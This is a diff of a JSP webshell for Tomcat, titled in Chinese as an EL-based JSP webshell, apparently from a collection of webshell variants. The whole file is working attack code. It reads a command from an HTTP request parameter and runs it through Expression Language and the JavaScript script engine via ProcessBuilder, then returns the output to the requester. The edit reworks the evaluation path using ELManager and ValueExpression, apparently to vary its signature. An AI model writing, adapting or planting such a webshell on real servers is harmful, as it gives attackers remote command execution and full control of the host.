@@ -1,29 +1,26 @@
-<%@ page import="javax.el.ELProcessor" %>
 <%@ page import="java.io.InputStream" %>
-<%@ page import="java.io.BufferedReader" %>
-<%@ page import="java.io.InputStreamReader" %>
+<%@ page import="javax.el.ELContext" %>
+<%@ page import="javax.el.ELManager" %>
+<%@ page import="javax.el.ExpressionFactory" %>
+<%@ page import="javax.el.ValueExpression" %>
+<%@ page import="sun.misc.IOUtils" %>
 <html>
 <body>
 <h2>Tomcat EL的JSP Webshell - 2</h2>
 <%
+    String cmd = request.getParameter("cmd");
     StringBuilder stringBuilder = new StringBuilder();
-    String cmd = request.getParameter("threedr3am");
     for (String tmp:cmd.split(" ")) {
         stringBuilder.append("'").append(tmp).append("'").append(",");
     }
     String f = stringBuilder.substring(0, stringBuilder.length() - 1);
-    ELProcessor processor = new ELProcessor();
-    Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")");
-    InputStream inputStream = process.getInputStream();
-    StringBuilder stringBuilder2 = new StringBuilder();
-    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-    String line;
-    while((line = bufferedReader.readLine()) != null) {
-        stringBuilder2.append(line).append("\n");
-    }
-    if (stringBuilder2.length() > 0) {
-        response.getOutputStream().write(stringBuilder2.toString().getBytes());
-    }
+    String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")";
+    ELManager manager = new ELManager();
+    ELContext context = manager.getELContext();
+    ExpressionFactory factory = ELManager.getExpressionFactory();
+    ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
+    InputStream inputStream = ((Process)ve.getValue(context)).getInputStream();
+    response.getOutputStream().write(IOUtils.readFully(inputStream, -1, false));
 %>
 </body>
 </html>
